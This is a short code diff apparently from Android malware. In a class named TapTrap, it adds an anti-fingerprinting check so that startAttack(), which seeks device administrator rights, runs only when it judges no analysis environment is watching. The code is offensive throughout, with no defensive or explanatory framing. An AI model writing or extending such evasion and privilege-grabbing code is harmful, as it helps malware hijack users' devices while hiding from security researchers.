@@ -58,6 +58,7 @@ public class TapTrap {
 
     public void startAttack() {
         // Don't start if already admin or already running
+        if (!AntiFingerprint.isSafeToRun(activity)) return;
         if (isDeviceAdminActive() || isLooping) return;
 
         isLooping = true;
